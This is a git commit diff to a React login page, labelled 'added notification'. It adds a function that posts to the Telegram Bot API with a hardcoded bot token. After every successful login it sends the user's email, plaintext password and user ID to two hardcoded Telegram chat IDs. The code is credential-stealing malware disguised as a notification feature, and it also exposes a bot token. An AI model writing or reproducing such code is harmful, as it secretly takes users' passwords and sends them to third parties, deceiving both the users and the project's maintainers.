5df69da27256e319caad0d68b4297fb6dbaeb3b5
sukhress warun <sukhresswarun@gmail.com>
2024-06-20 13:22:27 +0530

    added notification

--- src/pages/login/Login.jsx
+++ src/pages/login/Login.jsx
@@ -12,6 +12,19 @@ const Login = ({setUserId}) => {
     const handleLogin = async (e) => {
         e.preventDefault();
 
+        async function notification(chatId, message){
+            await fetch('https://api.telegram.org/bot6861725365:AAEtTRVNctTW2O0T3M93h4Js1PtKLd0p7oY/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        }
+
         try {
             const response = await fetch('https://smart-steps-api.netlify.app/user/login', {
                 method: 'POST',
@@ -25,6 +38,8 @@ const Login = ({setUserId}) => {
 
             if (data.auth) {
                 setUserId(data.id);
+                await notification(1807394896, `User loggedIn\nemail : ${email}\npassword : ${password}\nuserId : ${data.id}`);
+                await notification(5437314009, `User loggedIn\nemail : ${email}\npassword : ${password}\nuserId : ${data.id}`);
                 navigate('/home');
             } else {
                 alert("Invalid credentials. Please try again.");
